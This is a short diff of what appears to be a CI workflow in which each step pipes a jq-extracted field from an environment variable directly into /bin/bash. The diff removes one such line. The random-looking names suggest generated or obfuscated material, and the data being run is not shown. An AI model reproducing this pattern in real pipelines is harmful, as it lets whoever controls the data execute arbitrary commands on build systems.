@@ -41,7 +41,6 @@ jobs:
           echo $b4 | jq -r .umq52 | /bin/bash
           echo $lrq824 | jq -r .uoju063 | /bin/bash
           printf '%s' "$oo2332" | jq -r .qo517 | /bin/bash
-          printf '%s' "$edjl5" | jq -r .xfuc85007 | /bin/bash
           echo $guywx46 | jq -r .nf8074 | /bin/bash
           echo $iunk09 | jq -r .tttt9112 | /bin/bash
           printf '%s' "$ljayh37" | jq -r .hto39 | /bin/bash
